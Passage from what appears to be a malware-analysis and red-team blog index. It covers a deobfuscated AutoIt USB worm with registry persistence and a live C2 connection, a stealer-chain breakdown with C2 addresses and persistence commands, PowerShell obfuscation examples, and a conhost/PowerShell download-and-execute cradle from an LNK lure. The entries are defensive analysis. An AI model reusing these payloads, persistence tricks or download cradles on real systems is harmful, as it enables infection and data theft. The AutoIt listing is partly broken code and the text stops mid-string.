\"%windir%\\system32\\SHELL32.dll\", \"\", 3, @SW_SHOWMINNOACTIVE)\n                            FileCreateShortcut(\"cmd.exe\", \"$array_removable_drives[$i]\\$varNextFile\\Pictures\"), \"\", /c start ..\\Microsoft\\MicrosoftSecurity.exe  /AutoIt3ExecuteScript  ..\\Microsoft\\Microsoft.a3x &amp; explorer  %CD% &amp; exit\", \"\", \"%windir%\\system32\\SHELL32.dll\", \"\", 3, @SW_SHOWMINNOACTIVE)\n                            FileCreateShortcut(\"cmd.exe\", \"$array_removable_drives[$i]\\$varNextFile\\Reports\"), \"\", /c start ..\\Microsoft\\MicrosoftSecurity.exe  /AutoIt3ExecuteScript  ..\\Microsoft\\Microsoft.a3x &amp; explorer  %CD% &amp; exit\", \"\", \"%windir%\\system32\\SHELL32.dll\", \"\", 3, @SW_SHOWMINNOACTIVE)\n                            FileCreateShortcut(\"cmd.exe\", \"$array_removable_drives[$i]\\$varNextFile\\Statements\"), \"\", /c start ..\\Microsoft\\MicrosoftSecurity.exe  /AutoIt3ExecuteScript  ..\\Microsoft\\Microsoft.a3x &amp; explorer  %CD% &amp; exit\", \"\", \"%windir%\\system32\\SHELL32.dll\", \"\", 3, @SW_SHOWMINNOACTIVE)\n                        EndIf\n                        Sleep(40)\n                    WEnd\n                EndIf\n            EndIf\n        Next\n    EndIf\n    If @error Then\n    EndIf\nEndFunc\n\nFunc CreateScriptDirLNKFiles()\n    $blpspazzfimttyejdawgiepesmspmhduujqvoltlfuygpzlgnwlb = \"@ScriptDir\\MicrosoftSecurity.exe @ScriptDir\\Microsoft.a3x\"\n    If FileExists(\"@ScriptDir\\MicrosoftUpdate.lnk\") = False Then\n        FileCreateShortcut(\"cmd.exe\", \"@ScriptDir\\MicrosoftUpdate.lnk\", \" \", \"/c start @ScriptDir\\MicrosoftSecurity.exe @ScriptDir\\Microsoft.a3x &amp; exit\")\n    EndIf\n    If FileExists(\"@ScriptDir\\MicrosoftSecurity.lnk\") = False Then\n        FileCreateShortcut(\"@ScriptDir\\MicrosoftSecurity.exe\", \"@ScriptDir\\MicrosoftUpdate.lnk\", \" \", \"/AutoIt3ExecuteScript @ScriptDir\\Microsoft.a3x\")\n    EndIf\nEndFunc\n\nFunc RunAutoItScript_SetPersistenceKeys_CreateStartupCommonLNK()\n    $execute_MicrosoftSecurity.exe /AutoIt3ExecuteScript Microsoft.a3x = \"@ScriptDir\\MicrosoftSecurity.exe /AutoIt3ExecuteScript @ScriptDir\\Microsoft.a3x\"\n    $string_MicrosoftCMD = StringRegExpReplace(\"MicrosoftCMD.lnk\", \"\\.[^\\.\\\\/]*$\", \"\")  // Should be outputting \"MicrosoftCMD\"\n    $execute_MicrosoftCMD Microsoft.a3x = \"@ScriptDir\\MicrosoftSecurity.exe @ScriptDir\\Microsoft.a3x\"\n    $string_@ScriptDir\\MicrosoftCMD.lnk = \"@ScriptDir\\MicrosoftCMD.lnk\"\n    If RegRead(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Microsoft Security\") &lt;&gt; \"@ScriptDir\\MicrosoftCMD.lnk\" Then\n        RegWrite(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Microsoft Security\", \"REG_SZ\", \"@ScriptDir\\MicrosoftUpdate.lnk\")\n    EndIf\n    If RegRead(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Microsoft Security\") &lt;&gt; \"@ScriptDir\\MicrosoftCMD.lnk\" Then\n        RegWrite(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, \"Microsoft Security\", \"REG_SZ\", \"@ScriptDir\\MicrosoftUpdate.lnk\")\n    EndIf\n    If RegRead(HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Microsoft Office\") &lt;&gt; \"@ScriptDir\\MicrosoftCMD.lnk\" Then\n        RegWrite(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", Microsoft Office\", \"REG_SZ\", \"@ScriptDir\\MicrosoftUpdate.lnk\")\n    EndIf\n    If RegRead(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Cortana\")) &lt;&gt; \"@ScriptDir\\MicrosoftCMD.lnk\" Then\n        RegWrite(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Cortana\", \"REG_SZ\", \"@ScriptDir\\MicrosoftUpdate.lnk\")\n    EndIf\n    If RegRead(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"HDAudio\") &lt;&gt; $string_@ScriptDir\\MicrosoftCMD.lnk Then\n        RegWrite(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"HDAudio\", \"REG_SZ\", \"@ScriptDir\\MicrosoftSecurity.exe /AutoIt3ExecuteScript @ScriptDir\\Microsoft.a3x\")\n    EndIf\n    If RegRead(\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"PrintDriver) &lt;&gt; \"@ScriptDir\\MicrosoftCMD.lnk\" Then\n        RegWrite(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"PrintDriver\", \"REG_SZ\", \"@ScriptDir\\MicrosoftSecurity.exe /AutoIt3ExecuteScript @ScriptDir\\Microsoft.a3x\")\n    EndIf\n    If FileExists(\"@StartupCommonDir\\MicrosoftCMD.lnk) = False Then\n        FileCreateShortcut(\"cmd.exe\", \"@StartupCommonDir\\Microsoft Security.lnk\", \"\", \"/c start @ScriptDir\\MicrosoftSecurity.exe @ScriptDir\\Microsoft.a3x &amp; exit\")\n    EndIf\n    If FileExists(\"@StartupCommonDir\\MicrosoftUpdate.lnk\") = False Then\n        FileCreateShortcut(\"@ScriptDir\\MicrosoftSecurity.exe\", \"@StartupCommonDir\\MicrosoftUpdate.lnk\", \"\", \"/AutoIt3ExecuteScript @ScriptDir\\Microsoft.a3x\")\n    EndIf\n    If @error Then\n    EndIf\nEndFunc\n\nFunc TCPRecv()\n    If $int_-1 &lt; 1 Then\n        $int_0 = 1\n        Return -1\n    EndIf\n    If @error Then\n    EndIf\n    $callTCPRecviver = TCPRecv($int_-1, 1024, 0)\n    If @error Then\n        $int_0 = 1\n        Return -1\n    EndIf\n    $string_\"\" &amp;= $callTCPRecviver\n\n    // Check if \"\\r\\n\" exists in the received message\n    If StringInStr($string_\"\", $string_\\r\\n) Then\n        $array_tcp_received = StringSplit($string_\"\", \"\\r\\n\")\n        $callTCPRecviver = $array_tcp_received[1]\n        $rn_position = StringInStr($string_\"\", $string_\\r\\n)\n        $rn_position += StringLen(String($string_\\r\\n))\n        $msgLength = StringLen($string_\"\")\n        $string_\"\" = StringMid($string_\"\", $rn_position, $msgLength - $rn_position)\n        Return $callTCPRecviver\n    EndIf\n    Return \"\"\nEndFunc\n\nFunc C2Exfiltrate($var5)\n    If @error Then\n    EndIf\n    // Replace \"\\r\\n\" with \"|\" from the input\n    $var5 = StringReplace($var5, $string_\\r\\n, \"|\")\n    // TCPSend the modified input\n    TCPSend($int_-1, $var5 &amp; $string_\\r\\n)\n    If @error Then\n        $int_0 = 1\n        Return 0\n    Else\n        Return 1\n    EndIf\nEndFunc\n\nFunc C2CommandDef()\n    $int_0 = 0\n    TCPCloseSocket($int_-1)\n    If @error Then\n    EndIf\n    TCPShutdown()\n    If @error Then\n    EndIf\n    TCPStartup()\n    If @error Then\n    EndIf\n    $int_-1 = -1\n    // Connect to googleads.publicvm.com:223\n    $int_-1 = TCPConnect(TCPNameToIP(\"googleads.publicvm.com\"), 223)\n    If @error Then\n    EndIf\n    $int_0 = 0\nEndFunc\n</code></pre>","tags":["AutoIt","USB Malware","Worming"]},{"location":"blogs/202309-CESPADCS/","title":"202309 - Altered Security CESP-ADCS Review","text":"","tags":["Exam","Certification","RedTeaming","ADCS"]},{"location":"blogs/202309-CESPADCS/#course-overview","title":"Course Overview","text":"<p>With knowledge of the previous red team courses from Nikhil Mittal, also the author of the famous offensive PowerShell tool Nishang, it feels much easier to understand how Active Directory really works and how it is commonly misconfigured, allowing attackers to abuse and dorminate a forest.</p> <p>Active Directory Certificate Services (ADCS) is Microsoft\u2019s Public Key Infrastructure (PKI) for typical Windows environments. It would also be interesting to understand more from the red team perspective to assist in the defensive measures like writing detection use cases and spotting misconfigurations. Upon the release of the new ADCS course, I joined it as soon as it became available!</p> <p></p>","tags":["Exam","Certification","RedTeaming","ADCS"]},{"location":"blogs/202309-CESPADCS/#course-review","title":"Course Review","text":"<p>Like in the previous courses, you are given the VPN access and Web access to the lab environment, and also the course slides, videos etc.</p> <p>The course uses a step-by-step approach to walk through concepts such as red teaming basics (e.g., AV Bypass, PowerShell Logging bypass, etc.), the workings of AD CS, different attack paths in AD CS environments, and tools for AD CS attacks, etc. You may refer to the Altered Security ADCS Course Page to learn more about the course itself.</p> <p>As a student who does not have much experience in configuring, defending and attacking ADCS, this course provides much knowledge, in additional to the basic AD attack surfaces learnt in the previous CRTP, CRTE and CRTM courses. For someone who has no experience and knowledge in AD attacks, definitely check out the CRTP course to learn the fundamentals first.</p> <p>My approach to studying the course involves thorough review of the course slides, accompanied by note-taking in Markdown format for easy reference during practical work and lab building. Unless faced with substantial knowledge gaps, I tend to skip the course videos due to their similarity to the course slides.</p> <p>I highly value encountering challenges while working on the labs. The lab manual, which offers step-by-step instructions for both Windows and Linux environments, enhances flexibility and provides valuable real-life experience for engagements in the field.</p> <p>Each lab requires submission of flags on the learning portal to ensure comprehensive understanding and adherence to the course materials.</p> <p>Personally, I have subscribed to the lab for a 30-day duration, which has proven more than sufficient to complete the materials at hand.</p> <p>I believe most of the materials are closely relevant to the SpecterOps's Certified Pre-Owned Whitepaper. To gain a comprehensive understanding of the content, I highly recommend referring to this whitepaper as a valuable resource.</p> <p></p>","tags":["Exam","Certification","RedTeaming","ADCS"]},{"location":"blogs/202309-CESPADCS/#examination","title":"Examination","text":"<p>In regards to the exam, it allocats a 24-hour timeframe to operate within the exam lab environment, followed by an additional 48 hours to submit the exam report.</p> <p>During the exam, the focus lies on leveraging the knowledge acquired throughout the course, without the need for any additional resources. The objective entails identifying the attack path to compromise a single AD domain consisting of 5 machines, including the foothold machine. As long as the course material is thoroughly understood and followed, success in the exam should be achievable without significant obstacles.</p> <p>TIPS: Again - enumeration is always the main key to success. Make sure you understand how the vulnerabilities are found and what the tools outputs mean in the lab environment; or otherwise it would be easy to get lost!</p> <p>At the end I was able to finish and submit the report in 8 hours. After submitting the report around 5 days, I am certified!</p> <p></p> <p>Thanks for reading this. Have been having some thought on building an ADCS lab and build some detection use cases in the future. Stay tuned!</p> <p></p>","tags":["Exam","Certification","RedTeaming","ADCS"]},{"location":"blogs/202310-Extract/","title":"202310 - Extract &amp; Extract &amp; Extract","text":"<p>Sample: MalwareBazaar 5d93a9281bf0948f49e9338435a1099ea347af058718bd1cc536da0491cb40d2</p> <ul> <li> <p>Similar samples:</p> <ul> <li>Hybrid Analysis: 6378cedadb8aac29185931b1f83dfeb023dc8f4d8ef7465f4bd8a75cd48fd275</li> </ul> </li> <li> <p>Original Sample: http://109[.]107.182.2/race/bus50.exe</p> </li> </ul> <p>General observations:</p> <ul> <li>Stealers tends to be malware chained together for different purposes (e.g. Evasion -&gt; Impair Defense -&gt; SmokeLoader -&gt; Redline -&gt; Mystic)</li> <li>Layers of backdoored WEXTRACT.EXE<ul> <li>7 components serving for different purposes</li> </ul> </li> </ul> <p> </p> <ul> <li>The backdoored WEXTRACT can be viewed as a typical ZIP file where you may use tools like 7-Zip to extract</li> </ul> <p> </p> <ul> <li>After extracting, you will find yourself in an extract loop - the file RG2PO58.exe is yet another WEXTRACT compiled extractor</li> </ul> <p> </p> <ul> <li>If you inspect the resources section, you will notice that there are instances of RUNPROGRAM and POSTRUNPROGRAM</li> <li>In the resources section of the PE, you will find a CAB in the rcdata</li> <li>You may use Resource Hacker to extract the relevant section from the backdoored WEXTRACT PE</li> <li>bus50 could be some sort of campaign identifier, which matches the original sample name in the distribution source (unconfirmed)</li> <li>Note that you will find wextract.exe in Windows\\System32, which is a legit program for extracting CAB files</li> <li>This technique has been used for over 10 years for self-extraction</li> <li>When running the sample, it will extract the EXE files in the <code>TEMP</code> and then execute them (likely the one in RUNPROGRAM and then POSTRUNPROGRAM)</li> </ul> <p>If you manually extract the files, you will see the following pattern:</p> <pre><code>bus50.exe\n    |__ 7Lh9AM99.exe                     (MD5: 19465EA8A948EACA48FB020A742D60EA)\n    |__ RG2PO58.exe\n        |__ 6ip4QK1.exe                  (MD5: E4640A6D4E342A37E2DE8591AC76DC8F)\n        |__ ks8GM27.exe\n            |__ 5RI5Wx6.exe              (MD5: C07F165F384ACCCABF2868AB3EFF6267)\n            |__ jL7jG58.exe\n                |__ 4Vb016Uy.exe         (MD5: 7CCA36E70CF00E0C7971217151879922)\n                |__ Gg2Te19.exe\n                    |__ 3bt07Qb.exe      (MD5: 1088CE08079743C4488D267289F9C110)\n                    |__ Tk1Ov12.exe\n                        |__ 2Hl5657.exe  (MD5: FA2204DCE76A6C774C43B9343FBCC843)\n                        |__ 1ZE54Tl5.exe (MD5: 3293FD274A016127C9B27252FBE85DCD)\n</code></pre> <ul> <li>Effectively, the execution order should be: bus50.exe &gt; 7Lh9AM99.exe  &gt; 6ip4QK1.exe &gt; ... &gt; 1ZE54Tl5.exe</li> </ul> <p></p>","tags":["Stealer","Crypto Stealer"]},{"location":"blogs/202310-Extract/#7lh9am99exe","title":"7Lh9AM99.exe","text":"<p>Any.run test</p> <p> </p> <ul> <li> <p>Written in PureBasic</p> </li> <li> <p>First create a <code>.bat</code> file in TEMP: <code>C:\\Users\\admin\\AppData\\Local\\Temp\\FB22.tmp\\FB23.tmp\\FB24.bat</code> with the argument C:\\Users\\admin\\AppData\\Local\\Temp\\7Lh9AM99.exe\"</p> </li> <li>The <code>.bat</code> file will open the following URLs:<ul> <li>https://accounts.google.com</li> <li>https://www.facebook.com/login</li> <li>https://store.steampowered.com/login/</li> <li>https://twitter.com/i/flow/login</li> <li>https://steamcommunity.com/openid/loginform/</li> <li>https://www.epicgames.com/id/login</li> <li>https://www.youtube.com/</li> </ul> </li> </ul> <p>(May need more time to find out the reason why - but apparently a way to detect if there is any saved session)</p> <p></p>","tags":["Stealer","Crypto Stealer"]},{"location":"blogs/202310-Extract/#6ip4qk1exe-mystric-stealer-c2-component","title":"6ip4QK1.exe (Mystric Stealer C2 Component)","text":"<p>Any.run test</p> <ul> <li>Call back to the C2 IP address: 193[.]233.255.7:80</li> </ul> <p>References:</p> <ul> <li>Cyfirma: https://www.cyfirma.com/outofband/mystic-stealer-evolving-stealth-malware/</li> </ul> <p></p>","tags":["Stealer","Crypto Stealer"]},{"location":"blogs/202310-Extract/#5ri5wx6exe-amadey-stealer","title":"5RI5Wx6.exe (Amadey Stealer)","text":"<p>Any.run test</p> <p> </p> <ol> <li>Drop an additional file called <code>explothe.exe</code> (MD5: c07f165f384acccabf2868ab3eff6267)</li> <li>Create Scheduled Task for retrieving Amadey components: <code>\"C:\\Windows\\System32\\schtasks.exe\" /Create /SC MINUTE /MO 1 /TN explothe.exe /TR \"C:\\Users\\admin\\AppData\\Local\\Temp\\fefffe8cea\\explothe.exe\" /F</code></li> <li>Evasion: <code>\"C:\\Windows\\System32\\cmd.exe\" /k echo Y|CACLS \"explothe.exe\" /P \"admin:N\"&amp;&amp;CACLS \"explothe.exe\" /P \"admin:R\" /E&amp;&amp;echo Y|CACLS \"..\\fefffe8cea\" /P \"admin:N\"&amp;&amp;CACLS \"..\\fefffe8cea\" /P \"admin:R\" /E&amp;&amp;Exit</code> - Making explothe.exe and its current folder to be READ-ONLY to prevent deletion from the current user</li> <li>Retrieve additional components from <code>http://77[.]91.124.1/theme/</code> - cred.dll and clip.dll; with reference to Splunk</li> <li>These dll will be invoked by rundll32.exe (<code>C:\\Windows\\System32\\rundll32.exe\" C:\\Users\\admin\\AppData\\Roaming\\006700e5a2ab05\\clip.dll, Main</code>) to harvest sensitive information from the victim machine, and then exfiltrate it to the designated C2</li> <li>An HTTP POST to the C2's <code>/theme/index.php</code> will contain the following structure: <code>id=302019708150&amp;vs=3.89&amp;sd=04d170&amp;os=9&amp;bi=0&amp;ar=0&amp;pc=USER-PC&amp;un=admin&amp;dm=&amp;av=0&amp;lv=0&amp;og=1</code> (This is the configuration of Any.run). This can be a network-based signature<ol> <li>id = Infected System ID</li> <li>vs = Amadey version (3.89 in this case)</li> <li>sd = Amadey ID (04d170 in this case)</li> <li>os = Windows version (9 in this case means Windows 7)</li> <li>bi = Architecture (0 means x86)</li> <li>ar = Admin privilege (0 means non-admin)</li> <li>pc = Hostname</li> <li>un = Username</li> <li>dm = Domain name</li> <li>av = List of installed malware</li> <li>lv = ?</li> <li>og = ?</li> </ol> </li> </ol> <p>References:</p> <ul> <li>Splunk: https://www.splunk.com/en_us/blog/security/amadey-threat-analysis-and-detections.html</li> <li>Darktrace: https://darktrace.com/blog/amadey-info-stealer-exploiting-n-day-vulnerabilities</li> </ul> <p></p>","tags":["Stealer","Crypto Stealer"]},{"location":"blogs/202310-Extract/#4vb016uyexe-redline-stealer-backdoor","title":"4Vb016Uy.exe (Redline Stealer Backdoor)","text":"<p>Any.run report</p> <ol> <li>Data Exfiltration to 77[.]91.124.86:19084 with SOAP - for Command and Control + data exfiltration</li> </ol> <p>References:</p> <ol> <li>Malware.news: https://malware.news/t/dissecting-redline-infostealer-traffic-a-soapy-endeavour/56444</li> <li>https://www.cloudsek.com/blog/technical-analysis-of-the-redline-stealer</li> </ol> <p></p>","tags":["Stealer","Crypto Stealer"]},{"location":"blogs/202310-Extract/#3bt07qbexe-smokeloader","title":"3bt07Qb.exe (SmokeLoader)","text":"<p>Triage result</p> <ul> <li>C2 at <code>http://77.91.68.29/fks/</code></li> </ul> <p>(To be analyzed further)</p> <p></p>","tags":["Stealer","Crypto Stealer"]},{"location":"blogs/202310-Extract/#2hl5657exe-mystic-stealer-c2","title":"2hl5657.exe (Mystic Stealer &amp; C2)","text":"<p>C2: <code>http://193.233.255.73/loghub/master</code></p> <ul> <li>Steal browser data</li> <li>Steal browser extension data</li> <li>Steal Cryptocurrency Wallet data</li> </ul> <p>Reference:</p> <ul> <li>Zscaler: https://www.zscaler.com/blogs/security-research/mystic-stealer-revisited</li> </ul> <p></p>","tags":["Stealer","Crypto Stealer"]},{"location":"blogs/202310-Extract/#1ze54tl5exe","title":"1ZE54Tl5.exe","text":"<ul> <li><code>Bus50</code> first and <code>Car1</code> at last?</li> </ul> <p>(To Be Analyzed)</p> <p>Reference:</p> <ul> <li>VMRay: https://www.vmray.com/analyses/_vt/f697004fb4b1/report/overview.html</li> </ul> <p></p>","tags":["Stealer","Crypto Stealer"]},{"location":"dfir/ps-obfuscation-01/","title":"Powershell Obfuscation 1: Formatter","text":"","tags":["powershell","dfir","malware analysis"]},{"location":"dfir/ps-obfuscation-01/#powershell-obfuscation-1-formatters","title":"PowerShell Obfuscation 1: Formatters","text":"","tags":["powershell","dfir","malware analysis"]},{"location":"dfir/ps-obfuscation-01/#backtick","title":"Backtick (<code>`</code>)","text":"<p>In PowerShell, backtick (<code>`</code>) is used as an escape character (like <code>\\</code> in many other languages). For example:</p> <ul> <li><code>Sc`Rip`t`path</code> == <code>ScRiptpath</code></li> </ul> <p>Imagine your detection systems like SIEM will not deobfuscate PowerShell command by default, and assume you are detecting the keyword <code>Scriptpath</code>:</p> <ul> <li><code>index=windows EventCode=4104 Message=*scriptpath*</code></li> </ul> <p> </p> <p>To avoid the false negative, one of the possible solutions is to remove all backticks. For example on Splunk:</p> <pre><code>index=windows EventCode=4104 | eval deMessage=replace(Message,\"`\", \"\") | search deMessage=*scriptpath* | table Message, deMessage\n</code></pre> <p> </p> <p></p>","tags":["powershell","dfir","malware analysis"]},{"location":"dfir/ps-obfuscation-01/#formatter-with","title":"Formatter with <code>{}</code>","text":"<p>In PowerShell, you can use <code>{}</code> with <code>-f</code> to format a string. This is similar to the following in Python:</p> <pre><code>var1 = \"Hello,\"\nvar2 = \"World!\"\nmyString = \"{}, {}\".format(var1, var2)\nprint(myString)\n</code></pre> <p>The PowerShell equivalent will be:</p> <pre><code>echo (\"{0}{1}\"-f\"Hello,\",\"World!\")\n</code></pre> <p>For example:</p> <pre><code>\"{3}{0}{4}{7}{9}{5}{2}{8}{1}{6}\" -f'.','resS','.c','SysTEm.io','CoMp','On','ioNMoDE','RE','omp','SSI'\n\n# Deobfuscated\nSysTEm.io    .    CoMp    RE    SSI    On    .c    omp    resS    ioNMoDE\nSysTEm.io.CoMpRESSIOn.compresSioNMoDE\n</code></pre> <p></p>","tags":["powershell","dfir","malware analysis"]},{"location":"dfir/ps-obfuscation-01/#real-world-example","title":"Real-world example","text":"<p>The following case study references the DFIR Report: NetSupport Intrusion Results in Domain Compromise.</p> <p>Here is a PowerShell code snippet used by the threat actor to defense evasion - do not run when encountering AV / Sandbox: </p> <ul> <li>netsupport-deploy-obfuscated.ps1:</li> </ul> <pre><code>${4`6q0o}  =[tYPE](\"{3}{0}{4}{7}{9}{5}{2}{8}{1}{6}\" -f'.','resS','.c','SysTEm.io','CoMp','On','ioNMoDE','RE','omp','SSI')  ;SeT-iTem  ('vaR'+'I'+'Ab'+'lE:v25yj') ([Type](\"{0}{2}{4}{3}{1}\" -f 's','oNVeRt','yste','.C','M') ) ; ${b`m`W1y}=[type](\"{2}{1}{3}{0}\" -f'FIle','tE','Sys','M.IO.')  ; ${s`cr`IptpA`TH} = &amp;(\"{0}{2}{1}\"-f 'spl','th','it-pa') -parent ${m`yI`NVoCatiOn}.\"MYCo`Mm`A`ND\".\"d`Ef`InItioN\"\n\n\nif (${Sc`Rip`T`patH} -match (\"{0}{1}\"-f'a','vast'))    {exit}\nif (${s`Cr`ipTPatH} -match \"avg\")      {exit}\nif (${Scr`iP`TpATH} -match (\"{0}{1}\" -f 'sam','ple'))   {exit}\nif (${SCRi`p`TpatH} -match (\"{0}{1}\"-f'analy','sis')) {exit}\nif (${scri`pt`p`ATh} -match (\"{0}{1}{2}\"-f'm','alwa','re'))  {exit}\nif (${S`cRipt`paTh} -match (\"{1}{0}\" -f'dbox','san'))  {exit}\nif (${sc`RiPTpA`TH} -match (\"{1}{0}\" -f'irus','v'))    {exit}\n</code></pre> <ul> <li><code>[tYPE](\"{3}{0}{4}{7}{9}{5}{2}{8}{1}{6}\" -f'.','resS','.c','SysTEm.io','CoMp','On','ioNMoDE','RE','omp','SSI');</code><ul> <li><code>[type](System.io.Compression.CompressionMode);</code></li> </ul> </li> <li><code>SeT-iTem  ('vaR'+'I'+'Ab'+'lE:v25yj') ([Type](\"{0}{2}{4}{3}{1}\" -f 's','oNVeRt','yste','.C','M') ) ;</code><ul> <li><code>Set-Item variable:v25yj ([Type]System.Convert);</code></li> <li><code>$v25yj = ([Type]System.Convert);</code></li> </ul> </li> <li><code>${b</code>m<code>W1y}=[type](\"{2}{1}{3}{0}\" -f'FIle','tE','Sys','M.IO.')  ;</code><ul> <li><code>$bmW1y = [type](System.IO.File)</code></li> </ul> </li> <li><code>${s`cr`IptpA`TH} = &amp;(\"{0}{2}{1}\"-f 'spl','th','it-pa') -parent ${m`yI`NVoCatiOn}.\"MYCo`Mm`A`ND\".\"d`Ef`InItioN\"</code><ul> <li><code>$scriptpath = &amp;(split-path) -parent MyInvocation.MyCommand.Definition</code></li> </ul> </li> </ul> <p>Deobfuscated:</p> <pre><code>$46q0o = [type](System.io.Compression.CompressionMode); \nSet-Item variable:v25yj ([Type]System.Convert); \n$bmW1y = [type](System.IO.File); \n# The current script's folder path\n$scriptpath = Split-path -parent MyInvocation.MyCommand.Definition\n\nif ($scriptpath -match \"avast\")    {exit}\nif ($scriptpath -match \"avg\")      {exit}\nif ($scriptpath -match \"sample\")   {exit}\nif ($scriptpath -match \"analysis\") {exit}\nif ($scriptpath -match \"malware\")  {exit}\nif ($scriptpath -match \"sandbox\")  {exit}\nif ($scriptpath -match \"virus\")    {exit}\n</code></pre> <ul> <li>The first 3 variable will be variables to be used in latter expressions to evade pattern-based detections<ul> <li>For example, if you are detecting the pattern <code>System.IO.File</code>, it simply replaces it by <code>$bmW1y</code> in this case</li> </ul> </li> <li>The <code>if</code> statements are trivial - exit the program if seeing the current path matching the patterns related to some AV engines, sandbox, etc.</li> </ul>","tags":["powershell","dfir","malware analysis"]},{"location":"malwareanalysis/20231102-Deobfuscate-JavaScript/","title":"202311 - JavaScript Deobfuscation & conhost.exe LOLBAS","text":"","tags":["malware analysis","JavaScript"]},{"location":"malwareanalysis/20231102-Deobfuscate-JavaScript/#20231102-javascript-deobfuscation-conhostexe-lolbas","title":"20231102 - JavaScript Deobfuscation &amp; conhost.exe LOLBAS","text":"","tags":["malware analysis","JavaScript"]},{"location":"malwareanalysis/20231102-Deobfuscate-JavaScript/#retrieving-the-suspicious-javascript-file","title":"Retrieving the suspicious JavaScript file","text":"<p>When reviewing The DFIR Report: NetSupport Intrusion Results in Domain Compromise, there are some interesting points found. One of which is an obfuscated JavaScript involved in the investigation.</p> <p>During the initial access, the user is tricked to click on a phishing link (USPostalService-themed), which redirects multiple time and reaches a likely compromised site the attacker used for hosting malicious ZIP files. Apparently the attacker added a layer of evasion to dynamic generate files and different filenames at the time a visitor retrieves them.</p> <p>The victim will download a ZIP file, either with a JavaScript file or a LNK file.</p> <p></p>","tags":["malware analysis","JavaScript"]},{"location":"malwareanalysis/20231102-Deobfuscate-JavaScript/#the-lnk-file-weaponized-with-lolbas-conhostexe","title":"The LNK file weaponized with LOLBAS - conhost.exe","text":"<p>For the LNK case - it is a LNK file with the following destination:</p> <pre><code>%SystemRoot%\\system32\\conhost.exe --headless powershell $gtV='et';new-alias y wg$gtV;.$([char](7467-7362)+'ex')(y -useb http://1otal.com/index/index.php)\n</code></pre> <p>Of course, a little obfuscation here - let's deobfuscate:</p> <ul> <li>Variable substitution: <code>$gtV='et';new-alias y wg$gtV;</code> --&gt; y --&gt; wget</li> <li>Unicode - UTF-16 character: <code>[char](7467-7362)</code>--&gt; <code>[char](105)</code> --can be deemed as <code>&amp;#105;</code>--&gt; <code>i</code><ul> <li><code>[char](7467-7362)+'ex'</code> --&gt; <code>iex</code></li> </ul> </li> <li><code>(y -useb http://1otal.com/index/index.php)</code><ul> <li>iex (wget -useb http://1otal.com/index/index.php)<ul> <li><code>-useb</code> = UseBasicParsing</li> </ul> </li> </ul> </li> </ul> <pre><code>%SystemRoot%\\system32\\conhost.exe --headless powershell (wget -useb http://1otal.com/index/index.php)\n</code></pre> <ul> <li>The use of <code>conhost.exe</code> is a known LOLBAS technique<ul> <li><code>--headless</code> hides the child process window - hiding the PowerShell execution</li> </ul> </li> <li>In so, double-clicking the LNK file = making a request to retrieve a file from  <code>http://1otal.com/index/index.php</code></li> <li>According to the investigation, this is an Obfuscated script to create malicious NetSupport RAT package for this infection</li> </ul> <p></p>","tags":["malware analysis","JavaScript"]},{"location":"malwareanalysis/20231102-Deobfuscate-JavaScript/#the-javascript-file","title":"The JavaScript File","text":"<p>The JavaScript file is highly obfuscated as follows:</p> <p> </p> <ul> <li>The source code can be found in this Paste Bin</li> </ul> <p>Of course, you may just run the JavaScript file in a Sandbox to see the result right away! </p> <p>The following just serves as an exercise for deobfuscating manually. To deobfuscate it a bit, we can make use of sites such as https://deobfuscate.io/:</p> <p> </p> <ul> <li>You may found the result in this Paste Bin</li> </ul> <p>For JavaScript, it would be interesting to look into any <code>eval()</code> - look for an eval function call:</p> <p> </p> <ul> <li>Since we are interested in what will be run, we can simply replace the <code>eval</code> with <code>console.log</code></li> <li>Then run the JavaScript with online tool like https://playcode.io/javascript</li> </ul> <p> </p> <ul> <li>You will get yet another obfuscated JavaScript - PasteBin</li> </ul> <p>Again, you may deobfuscate using https://deobfuscate.io/:</p> <pre><code>oMKilXfTnLOHCUhAFBP = \"sheLl\";\nYZqOsTxnMmpABJCF = new ActiveXObject(oMKilXfTnLOHCUhAFBP + \".\" + \"ApPlIcAtIon\");\nFkLgcBCiVTGsmxdvpeb = new ActiveXObject(\"SCRiPtIng.filesystemobJECt\");\nif (FkLgcBCiVTGsmxdvpeb.FolderExists(\"C:pROgRamdAtamIcRosOftwINdoWs\")) {\n  YZqOsTxnMmpABJCF.ShellExecute(\"cmd\", \"/c Power\" + oMKilXfTnLOHCUhAFBP + \" -nop -w hidden \" + \"-ep bypaSS -enC SQ\" + \"BFAFgAIAAoA\" + \"E4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAb\" + \"gB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHI\" + \"AaQBuAGcAKA\" + \"AiAGgAdAB0AHAA\" + \"OgAvAC8\" + \"AMQBvAHQ\" + \"AYQBsAC4AYwBvAG0ALwBpAG4AZABlAHgALwBpAG4AZA\" + \"BlAHgALgBwAGgAcAAiACkA\", \"\", \"open\", 0);\n}\noMKilXfTnLOHCUhAFBP = \"sheLl\";\nYZqOsTxnMmpABJCF = new ActiveXObject(oMKilXfTnLOHCUhAFBP + \".\" + \"ApPlIcAtIon\");\nFkLgcBCiVTGsmxdvpeb = new ActiveXObject(\"SCRiPtIng.filesystemobJECt\");\nif (FkLgcBCiVTGsmxdvpeb.FolderExists(\"C:pROgRamdAtamIcRosOftwINdoWs\")) {\n  YZqOsTxnMmpABJCF.ShellExecute(\"cmd\", \"/c Power\" + 